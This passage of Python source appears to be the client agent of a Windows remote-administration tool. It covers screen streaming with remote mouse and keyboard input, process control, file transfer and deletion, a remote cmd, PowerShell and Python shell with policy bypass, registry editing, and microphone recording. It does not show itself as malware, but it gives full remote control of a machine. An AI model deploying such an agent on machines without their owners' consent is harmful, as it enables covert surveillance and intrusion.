        """FIXED: Retry auth up to 6 times with 1s backoff before giving up.
        The main socket agent_connect may not have reached the server yet.
        """
        log.warning(f"Advanced Monitor auth failed: {data.get('msg')} — retrying in 2s…")
        await asyncio.sleep(2)
        log.info("Advanced Monitor: re-sending agent_auth…")
        await sio.emit("agent_auth", {"token": token})

    @sio.on("viewer_count")
    async def on_viewer_count(data):
        global _adv_viewers
        prev = _adv_viewers
        _adv_viewers = data.get("count", 0)
        if prev == 0 and _adv_viewers > 0:
            log.info(f"Advanced Monitor: viewer connected (count={_adv_viewers}) — stream starting")
        elif _adv_viewers == 0 and prev > 0:
            log.info("Advanced Monitor: all viewers disconnected — stream paused")
        elif _adv_viewers > 0:
            log.debug(f"Advanced Monitor: viewer count update ({_adv_viewers})")

    @sio.on("input_event")
    async def on_input_event(data):
        """Second-site input event handler — absolute pixel coords, PAUSE=0."""
        evt = data.get("type")
        try:
            mx, my = _to_monitor_absolute(data.get("x", 0), data.get("y", 0))
            if   evt == "mouse_move":
                pyautogui.moveTo(mx, my, _pause=False)
            elif evt in ("mouse_click", "mouse_dblclick"):
                btn = "left" if data.get("button") == "left" else "right"
                if evt == "mouse_dblclick":
                    pyautogui.doubleClick(mx, my, button=btn, _pause=False)
                elif "down" not in data:
                    pyautogui.click(mx, my, button=btn, _pause=False)
                else:
                    fn = pyautogui.mouseDown if data.get("down") else pyautogui.mouseUp
                    fn(mx, my, button=btn, _pause=False)
            elif evt == "mouse_scroll":
                pyautogui.scroll(int(data.get("delta", 3)), x=mx, y=my, _pause=False)
            elif evt == "key_event":
                fn = pyautogui.keyDown if data.get("down") else pyautogui.keyUp
                fn(data.get("key", ""), _pause=False)
            elif evt == "type_text":
                pyautogui.typewrite(data.get("text", ""), interval=0.005, _pause=False)
        except Exception as e:
            log.debug(f"Advanced Monitor input error: {e}")

    @sio.on("agent_ping")
    async def on_agent_ping(data):
        await sio.emit("agent_pong", {"ts": data.get("ts", 0)})

    # ── WebRTC signaling ──────────────────────────────────────────────────
    @sio.on("webrtc_offer")
    async def on_webrtc_offer(data):
        if not WEBRTC_OK: return
        viewer_sid = data.get("viewer_sid")
        sdp_data   = data.get("sdp")
        if not viewer_sid or not sdp_data: return
        await _adv_close_peer(viewer_sid)
        try:
            pc = RTCPeerConnection()
            _adv_webrtc_peers[viewer_sid] = pc

            @pc.on("datachannel")
            def on_datachannel(channel):
                if channel.label == "frames":
                    _adv_webrtc_channels[viewer_sid] = channel
                    @channel.on("close")
                    def on_dc_close():
                        _adv_webrtc_channels.pop(viewer_sid, None)

            @pc.on("icecandidate")
            async def on_ice(candidate):
                if candidate:
                    await sio.emit("webrtc_ice_agent", {
                        "viewer_sid": viewer_sid,
                        "candidate": {
                            "candidate": candidate.candidate,
                            "sdpMid": candidate.sdpMid,
                            "sdpMLineIndex": candidate.sdpMLineIndex,
                        },
                    })

            @pc.on("connectionstatechange")
            async def on_state():
                if pc.connectionState in ("failed", "closed", "disconnected"):
                    await _adv_close_peer(viewer_sid)

            offer  = RTCSessionDescription(sdp=sdp_data["sdp"], type=sdp_data["type"])
            await pc.setRemoteDescription(offer)
            answer = await pc.createAnswer()
            await pc.setLocalDescription(answer)
            await sio.emit("webrtc_answer", {
                "viewer_sid": viewer_sid,
                "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type},
            })
        except Exception as e:
            log.error(f"Advanced Monitor WebRTC offer error for viewer={viewer_sid}: {e}")
            await _adv_close_peer(viewer_sid)

    @sio.on("webrtc_ice")
    async def on_webrtc_ice(data):
        if not WEBRTC_OK: return
        viewer_sid = data.get("viewer_sid")
        candidate  = data.get("candidate")
        if not viewer_sid or not candidate: return
        pc = _adv_webrtc_peers.get(viewer_sid)
        if not pc: return
        try:
            ice = RTCIceCandidate(
                candidate=candidate.get("candidate", ""),
                sdpMid=candidate.get("sdpMid"),
                sdpMLineIndex=candidate.get("sdpMLineIndex"),
            )
            await pc.addIceCandidate(ice)
        except Exception as e:
            log.debug(f"Advanced Monitor ICE candidate error: {e}")

    await sio.connect(server_url, transports=["websocket", "polling"])
    await asyncio.gather(
        _adv_task_stream_frames(),
        _adv_task_stream_cursor(),
    )


_adv_monitor_started = False  # ensure we only start it once


# ── Main-socket screenshot fallback ─────────────────────────────────────────
# When the adv socket fails to auth, this thread streams screenshots via the
# main socket so both Advanced Monitor and Live Viewer show frames.
_fb_thread: threading.Thread = None
_fb_stop    = threading.Event()

def _start_screenshot_fallback(sio_client):
    """Launch a screenshot-via-main-socket fallback if not already running."""
    global _fb_thread, _fb_stop
    if _fb_thread and _fb_thread.is_alive():
        return
    _fb_stop.clear()

    def _fb_loop():
        log.info("Screenshot fallback: starting main-socket frame relay")
        import struct as _struct
        FLAG_JPEG = 0x02
        FRAME_HDR = _struct.Struct(">IIQII")
        fps = quality = None
        interval = 1.0 / 15
        cap = None
        cfg_sig = None
        n = 0
        while not _fb_stop.is_set():
            try:
                # Stop if adv socket is now working
                if (
                    _adv_authed and _adv_sio_async and _adv_sio_async.connected
                    and (time.monotonic() - _adv_last_frame_ts) < 2.0
                ):
                    log.info("Screenshot fallback: adv socket now active — stopping fallback")
                    break
                if _adv_viewers == 0:
                    time.sleep(0.1); continue
                next_sig = _current_stream_config()
                if next_sig != cfg_sig or cap is None:
                    if cap:
                        try: cap.close()
                        except Exception: pass
                    fps = next_sig[1]
                    quality = next_sig[2]
                    interval = 1.0 / max(1, min(fps, 15))  # cap at 15fps for main socket
                    cap = _make_capture()
                    cfg_sig = next_sig
                    log.info(f"Screenshot fallback: reconfigured monitor={next_sig[0]} fps={fps} quality={quality}")
                frame = cap.grab()
                if frame is None:
                    time.sleep(interval); continue
                h, w = frame.shape[:2]
                ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
                if not ok:
                    time.sleep(interval); continue
                payload = buf.tobytes()
                ts_us   = int(time.time() * 1_000_000)
                header  = FRAME_HDR.pack(w, h, ts_us, FLAG_JPEG, len(payload))
                pkt     = header + payload
                if sio_client and sio_client.connected:
                    sio_client.emit("screenshot_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "frame":     base64.b64encode(payload).decode(),
                        "image":     base64.b64encode(payload).decode(),
                        "w": w, "h": h,
                        "_raw_bin":  False,
                    })
                    # Also emit frame_bin_relay (binary fallback for adv viewers)
                    sio_client.emit("frame_bin_relay", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "data": list(pkt),
                    })
                n += 1
                time.sleep(interval)
            except Exception as e:
                log.debug(f"Screenshot fallback loop error: {e}")
                time.sleep(1)
        if cap:
            try: cap.close()
            except: pass
        log.info("Screenshot fallback: stopped")

    _fb_thread = threading.Thread(target=_fb_loop, daemon=True, name="fb-screenshot")
    _fb_thread.start()


def start_advanced_monitor(server_url: str, token: str):
    """Launch the async advanced monitor engine in a dedicated thread."""
    global _adv_loop, _adv_thread, _adv_monitor_started
    # FIX: check actual thread liveness — flag alone misses crashed threads
    if _adv_monitor_started and _adv_thread and _adv_thread.is_alive():
        log.info("Advanced Monitor already running — skipping restart")
        return
    if _adv_monitor_started:
        log.warning("Advanced Monitor thread died — restarting")
    _adv_monitor_started = True

    def _run():
        global _adv_loop
        _adv_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(_adv_loop)
        while True:
            try:
                _adv_loop.run_until_complete(_adv_main(server_url, token))
            except Exception as e:
                log.warning(f"Advanced Monitor loop error: {e} — retrying in 5s")
            time.sleep(5)

    _adv_thread = threading.Thread(target=_run, daemon=True, name="adv-monitor")
    _adv_thread.start()
    log.info("Advanced Monitor engine started (second-site v2.1 engine)")


# ── Stub classes kept for compatibility with non-streaming parts of main agent
# ── Stub classes kept for compile compatibility (not used for streaming) ──
class CursorTracker:
    """Stub — Advanced Monitor engine handles cursor at 60Hz independently."""
    def __init__(self, sio_client): pass
    def get_pos(self): return 0, 0, False, "left"
    def start(self): pass
    def stop(self): pass


class NetworkMonitor:
    """Stub — no longer needed; second-site engine manages its own throughput."""
    def start(self): pass
    def stop(self): pass
    def get_mbps(self): return 0.0


_net_monitor = NetworkMonitor()


class ScreenStreamer:
    """Stub — replaced by Advanced Monitor engine. All calls are no-ops."""
    def __init__(self, sio_client, cursor): pass
    def start(self, **kwargs): pass
    def stop(self): pass
    def on_ack(self): pass
    def capture_single(self): return None
    @property
    def monitor_idx(self): return CONFIG["STREAM_MONITOR"]
    @property
    def fps(self): return CONFIG["STREAM_FPS"]
    @fps.setter
    def fps(self, v): pass
    @property
    def _quality_current(self): return CONFIG["STREAM_QUALITY"]
    @_quality_current.setter
    def _quality_current(self, v): pass
    @property
    def scale(self): return 1.0
    @scale.setter
    def scale(self, v): pass
    def set_mode(self, mode): pass


# ════════════════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY MODULE
# ════════════════════════════════════════════════════════════════════════════
class SystemMonitor:
    def __init__(self, sio_client):
        self.sio       = sio_client
        self.monitoring = False
        self._thread: Optional[threading.Thread] = None

    def start(self, interval: int = 2):
        if self.monitoring:
            return
        self.monitoring = True
        self._thread = threading.Thread(target=self._loop, args=(interval,), daemon=True)
        self._thread.start()

    def stop(self):
        self.monitoring = False

    def get_snapshot(self) -> dict:
        vm   = psutil.virtual_memory()
        disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\")
        net  = psutil.net_io_counters()
        bat  = psutil.sensors_battery()
        swap = psutil.swap_memory()

        stats = {
            "device_id":        CONFIG["DEVICE_TOKEN"],
            "ts":               datetime.utcnow().isoformat(),
            "cpu_percent":      psutil.cpu_percent(interval=0.1),
            "cpu_per_core":     psutil.cpu_percent(percpu=True),
            "cpu_count":        psutil.cpu_count(logical=True),
            "cpu_count_phys":   psutil.cpu_count(logical=False),
            "cpu_freq_mhz":     round(psutil.cpu_freq().current, 1) if psutil.cpu_freq() else 0,
            "ram_total_gb":     round(vm.total     / (1024**3), 2),
            "ram_used_gb":      round(vm.used      / (1024**3), 2),
            "ram_free_gb":      round(vm.available / (1024**3), 2),
            "ram_percent":      vm.percent,
            "swap_total_gb":    round(swap.total / (1024**3), 2),
            "swap_used_gb":     round(swap.used  / (1024**3), 2),
            "swap_percent":     swap.percent,
            "disk_total_gb":    round(disk.total / (1024**3), 2),
            "disk_used_gb":     round(disk.used  / (1024**3), 2),
            "disk_free_gb":     round(disk.free  / (1024**3), 2),
            "disk_percent":     disk.percent,
            "net_sent_mb":      round(net.bytes_sent / (1024**2), 2),
            "net_recv_mb":      round(net.bytes_recv / (1024**2), 2),
            "net_packets_sent": net.packets_sent,
            "net_packets_recv": net.packets_recv,
            "net_mbps_up":      round(_net_monitor.get_mbps(), 2),
            "battery_pct":      bat.percent       if bat else None,
            "battery_plug":     bat.power_plugged  if bat else None,
            "boot_time":        datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "uptime_hrs":       round((time.time() - psutil.boot_time()) / 3600, 2),
        }

        if WMI_OK:
            try:
                c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
                stats["temperatures"] = {s.Name: round(s.Value, 1) for s in c.Sensor() if s.SensorType == "Temperature"}
            except Exception:
                stats["temperatures"] = {}
            try:
                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion, "memory_mb": round(int(g.AdapterRAM or 0) / (1024**2), 0)} for g in wmi.WMI().Win32_VideoController()]
            except Exception:
                stats["gpus"] = []
        else:
            stats["temperatures"] = {}
            stats["gpus"] = []

        return stats

    def get_disk_list(self) -> list:
        result = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                io = None
                try:
                    ios = psutil.disk_io_counters(perdisk=True)
                    dev_name = p.device.replace("\\", "").replace(":", "").lower()
                    for k, v in ios.items():
                        if dev_name in k.lower():
                            io = {"read_mb": round(v.read_bytes / (1024**2), 1),
                                  "write_mb": round(v.write_bytes / (1024**2), 1)}
                            break
                except Exception:
                    pass
                result.append({
                    "device":     p.device,
                    "mountpoint": p.mountpoint,
                    "fstype":     p.fstype,
                    "total_gb":   round(u.total / (1024**3), 2),
                    "used_gb":    round(u.used  / (1024**3), 2),
                    "free_gb":    round(u.free  / (1024**3), 2),
                    "percent":    u.percent,
                    "io":         io,
                })
            except Exception:
                pass
        return result

    def get_network_interfaces(self) -> dict:
        addrs = {}
        stats = psutil.net_if_stats()
        for iface, addr_list in psutil.net_if_addrs().items():
            st = stats.get(iface)
            addrs[iface] = {
                "addresses": [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list],
                "is_up":     st.isup if st else False,
                "speed_mbps": st.speed if st else 0,
            }
        return addrs

    def _loop(self, interval):
        while self.monitoring:
            try:
                self.sio.emit("system_stats_report", self.get_snapshot())
            except Exception as e:
                log.error(f"SysMonitor error: {e}")
            time.sleep(interval)


# ════════════════════════════════════════════════════════════════════════════
#  PROCESS MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ProcessManager:
    @staticmethod
    def list_processes() -> list:
        procs = []
        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
                                       "memory_percent", "username", "create_time",
                                       "cmdline", "exe"]):
            try:
                info = p.info
                info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
                info["cmdline"]     = " ".join(info.get("cmdline") or [])[:256]
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)

    @staticmethod
    def kill_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            try:
                p.wait(timeout=3)
            except psutil.TimeoutExpired:
                p.kill()
            return {"success": True, "message": f"Terminated PID {pid} ({name})"}
        except psutil.NoSuchProcess:
            return {"success": False, "message": f"PID {pid} not found."}
        except psutil.AccessDenied:
            return {"success": False, "message": f"Access denied for PID {pid}."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def start_process(command: str) -> dict:
        try:
            proc = subprocess.Popen(command, shell=True,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
            return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def suspend_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            p.suspend()
            return {"success": True, "message": f"Suspended PID {pid}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def resume_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            p.resume()
            return {"success": True, "message": f"Resumed PID {pid}"}
        except Exception as e:
            return {"success": False, "message": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  FILE BROWSER
# ════════════════════════════════════════════════════════════════════════════
class FileBrowser:
    MAX_UPLOAD_MB  = 100
    MAX_READ_KB    = 1024

    @staticmethod
    def list_directory(path: str) -> dict:
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"Not found: {path}"}
            if not p.is_dir():
                return {"error": f"Not a directory: {path}"}
            entries = []
            for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    stat = item.stat()
                    entries.append({
                        "name":     item.name,
                        "path":     str(item),
                        "type":     "dir" if item.is_dir() else "file",
                        "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
                        "size_b":   stat.st_size if item.is_file() else None,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "created":  datetime.fromtimestamp(stat.st_ctime).isoformat(),
                        "hidden":   item.name.startswith("."),
                        "ext":      item.suffix.lower() if item.is_file() else "",
                    })
                except (PermissionError, OSError):
                    entries.append({
                        "name": item.name,
                        "path": str(item),
                        "type": "dir" if item.is_dir() else "file",
                        "error": "access denied",
                    })
            parent = str(p.parent) if p.parent != p else None
            return {"path": str(p), "parent": parent, "entries": entries, "count": len(entries)}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def read_file(path: str, max_kb: int = 1024) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_kb = p.stat().st_size / 1024
            if size_kb > max_kb:
                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
            try:
                content = p.read_text(encoding="utf-8")
            except UnicodeDecodeError:
                content = p.read_text(encoding="latin-1", errors="replace")
            return {"path": str(p), "content": content,
                    "size_kb": round(size_kb, 2), "lines": content.count("\n")}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def write_file(path: str, content: str) -> dict:
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")
            return {"success": True, "path": str(p), "bytes": p.stat().st_size}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def download_file(path: str) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_mb = p.stat().st_size / (1024**2)
            if size_mb > FileBrowser.MAX_UPLOAD_MB:
                return {"error": f"File too large ({size_mb:.1f} MB > {FileBrowser.MAX_UPLOAD_MB} MB)."}
            return {
                "path":     str(p),
                "filename": p.name,
                "size_mb":  round(size_mb, 3),
                "data":     base64.b64encode(p.read_bytes()).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def upload_file(path: str, data_b64: str) -> dict:
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            raw = base64.b64decode(data_b64)
            p.write_bytes(raw)
            return {"success": True, "path": str(p), "bytes": len(raw)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def delete_file(path: str) -> dict:
        try:
            p = Path(path)
            if p.is_file():
                p.unlink()
                return {"success": True, "message": f"Deleted: {path}"}
            elif p.is_dir():
                _shutil.rmtree(str(p))
                return {"success": True, "message": f"Deleted dir: {path}"}
            return {"success": False, "message": "Path not found."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def copy_file(src: str, dst: str) -> dict:
        try:
            _shutil.copy2(src, dst)
            return {"success": True, "message": f"Copied {src} → {dst}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def move_file(src: str, dst: str) -> dict:
        try:
            _shutil.move(src, dst)
            return {"success": True, "message": f"Moved {src} → {dst}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def create_folder(path: str) -> dict:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return {"success": True, "path": path}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def rename(old: str, new: str) -> dict:
        try:
            Path(old).rename(new)
            return {"success": True, "old": old, "new": new}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def search(root: str, pattern: str, max_results: int = 200) -> dict:
        try:
            results = []
            for p in Path(root).rglob(pattern):
                results.append(str(p))
                if len(results) >= max_results:
                    break
            return {"results": results, "count": len(results), "pattern": pattern, "root": root}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_drives() -> list:
        drives = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                drives.append({
                    "drive":    p.mountpoint,
                    "label":    p.device,
                    "total_gb": round(u.total / (1024**3), 2),
                    "used_gb":  round(u.used  / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                    "fstype":   p.fstype,
                })
            except Exception:
                pass
        return drives


# ════════════════════════════════════════════════════════════════════════════
#  REMOTE SHELL (with PowerShell + CMD + Python REPL)
# ════════════════════════════════════════════════════════════════════════════
class RemoteShell:
    TIMEOUT = 60

    @staticmethod
    def execute(command: str, shell_type: str = "cmd") -> dict:
        t0 = time.time()
        try:
            env = os.environ.copy()
            if shell_type == "powershell":
                cmd = ["powershell", "-NoProfile", "-NonInteractive",
                       "-ExecutionPolicy", "Bypass", "-Command", command]
                shell_flag = False
            elif shell_type == "python":
                cmd = [sys.executable, "-c", command]
                shell_flag = False
            else:
                cmd = command
                shell_flag = True
            result = subprocess.run(
                cmd, shell=shell_flag,
                capture_output=True, text=True,
                timeout=RemoteShell.TIMEOUT, env=env,
                cwd=os.path.expanduser("~"),
            )
            return {
                "success":    True,
                "command":    command,
                "shell_type": shell_type,
                "stdout":     result.stdout[-16384:],
                "stderr":     result.stderr[-4096:],
                "returncode": result.returncode,
                "elapsed_s":  round(time.time() - t0, 3),
                "ts":         datetime.utcnow().isoformat(),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "command": command, "error": f"Timed out ({RemoteShell.TIMEOUT}s)."}
        except Exception as e:
            return {"success": False, "command": command, "error": str(e)}

    @staticmethod
    def get_env() -> dict:
        return {"env": dict(os.environ), "cwd": os.getcwd()}

    @staticmethod
    def set_cwd(path: str) -> dict:
        try:
            os.chdir(path)
            return {"success": True, "cwd": os.getcwd()}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  REGISTRY MANAGER
# ════════════════════════════════════════════════════════════════════════════
class RegistryManager:
    HIVES = {
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKU":  winreg.HKEY_USERS,
        "HKCC": winreg.HKEY_CURRENT_CONFIG,
    }

    @classmethod
    def _parse_path(cls, path: str):
        parts = path.replace("/", "\\").split("\\", 1)
        hive_str = parts[0].upper()
        subkey = parts[1] if len(parts) > 1 else ""
        hive = cls.HIVES.get(hive_str)
        if not hive:
            raise ValueError(f"Unknown hive: {hive_str}")
        return hive, subkey

    @classmethod
    def read_key(cls, path: str, value_name: str = "") -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                data, reg_type = winreg.QueryValueEx(k, value_name)
                return {"success": True, "path": path, "name": value_name, "data": str(data), "type": reg_type}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def list_key(cls, path: str) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                values = []
                i = 0
                while True:
                    try:
                        name, data, reg_type = winreg.EnumValue(k, i)
                        values.append({"name": name, "data": str(data)[:512], "type": reg_type})
                        i += 1
                    except OSError:
                        break
                subkeys = []
                i = 0
                while True:
                    try:
                        subkeys.append(winreg.EnumKey(k, i))
                        i += 1
                    except OSError:
                        break
                return {"success": True, "path": path, "values": values, "subkeys": subkeys}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def write_key(cls, path: str, value_name: str, data: str, reg_type: int = winreg.REG_SZ) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                winreg.SetValueEx(k, value_name, 0, reg_type, data)
            return {"success": True, "path": path, "name": value_name}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def delete_value(cls, path: str, value_name: str) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                winreg.DeleteValue(k, value_name)
            return {"success": True, "path": path, "name": value_name}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  SERVICE MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ServiceManager:
    @staticmethod
    def list_services() -> list:
        try:
            result = subprocess.run(
                ["sc", "query", "type=", "all", "state=", "all"],
                capture_output=True, text=True, timeout=20
            )
            services = []
            if WMI_OK:
                for svc in wmi.WMI().Win32_Service():
                    services.append({
                        "name":        svc.Name,
                        "display":     svc.DisplayName,
                        "state":       svc.State,
                        "start_type":  svc.StartMode,
                        "path":        svc.PathName or "",
                    })
            return services
        except Exception as e:
            return [{"error": str(e)}]

    @staticmethod
    def control_service(name: str, action: str) -> dict:
        """action: start | stop | restart | pause | resume"""
        try:
            cmds = {
                "start":   ["net", "start", name],
                "stop":    ["net", "stop",  name],
                "restart": None,
                "pause":   ["sc", "pause",  name],
                "resume":  ["sc", "continue", name],
            }
            if action == "restart":
                subprocess.run(["net", "stop",  name], capture_output=True, timeout=20)
                time.sleep(2)
                r = subprocess.run(["net", "start", name], capture_output=True, text=True, timeout=20)
            elif action in cmds:
                r = subprocess.run(cmds[action], capture_output=True, text=True, timeout=20)
            else:
                return {"success": False, "error": f"Unknown action: {action}"}
            return {"success": r.returncode == 0, "name": name, "action": action,
                    "stdout": r.stdout, "stderr": r.stderr}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  WINDOW MANAGER
# ════════════════════════════════════════════════════════════════════════════
class WindowManager:
    @staticmethod
    def list_windows() -> list:
        if not WIN32_OK:
            return [{"error": "pywin32 not available"}]
        windows = []
        def enum_cb(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:
                    rect = win32gui.GetWindowRect(hwnd)
                    try:
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        try:
                            proc = psutil.Process(pid)
                            pname = proc.name()
                        except Exception:
                            pname = ""
                    except Exception:
                        pid, pname = 0, ""
                    windows.append({
                        "hwnd":    hwnd,
                        "title":   title,
                        "rect":    rect,
                        "pid":     pid,
                        "process": pname,
                    })
        win32gui.EnumWindows(enum_cb, None)
        return windows

    @staticmethod
    def focus_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.SetForegroundWindow(hwnd)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def close_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def minimize_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def maximize_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  INSTALLED APPS
# ════════════════════════════════════════════════════════════════════════════
class InstalledApps:
    @staticmethod
    def list_apps() -> list:
        apps = []
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        seen = set()
        for hive, path in reg_paths:
            try:
                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            sub_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, sub_name) as sub:
                                def rv(n, d=""):
                                    try: return winreg.QueryValueEx(sub, n)[0]
                                    except: return d
                                name = rv("DisplayName")
                                if name and name not in seen:
                                    seen.add(name)
                                    apps.append({
                                        "name":      name,
                                        "version":   rv("DisplayVersion"),
                                        "publisher": rv("Publisher"),
                                        "install_date": rv("InstallDate"),
                                        "size_mb":   round(int(rv("EstimatedSize", 0)) / 1024, 1),
                                        "location":  rv("InstallLocation"),
                                    })
                        except Exception:
                            pass
            except Exception:
                pass
        return sorted(apps, key=lambda x: x.get("name", "").lower())


# ════════════════════════════════════════════════════════════════════════════
#  AUDIO CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class AudioCapture:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self.running = False
        self._thread: Optional[threading.Thread] = None

    def capture_chunk(self, seconds: float = 3.0, sample_rate: int = 16000) -> dict:
        if not AUDIO_OK:
            return {"error": "sounddevice not available"}
        try:
            recording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate,
                               channels=1, dtype="int16")
            sd.wait()
            buf = BytesIO()
            wavfile.write(buf, sample_rate, recording)
            return {
                "success":     True,
                "duration_s":  seconds,
                "sample_rate": sample_rate,
                "data":        base64.b64encode(buf.getvalue()).decode(),
                "ts":          datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_devices() -> list:
        if not AUDIO_OK:
            return []
        try:
            devs = sd.query_devices()
            return [{"index": i, "name": d["name"], "channels_in": d["max_input_channels"],
                     "channels_out": d["max_output_channels"]} for i, d in enumerate(devs)]
        except Exception:
            return []


# ════════════════════════════════════════════════════════════════════════════
#  ALERT ENGINE
# ════════════════════════════════════════════════════════════════════════════
class AlertEngine:
    def __init__(self, sio_client):
        self.sio         = sio_client
        self._last_alerts: Dict[str, float] = {}
        self.running     = False
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self.running or not CONFIG["ENABLE_ALERTS"]:
            return
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
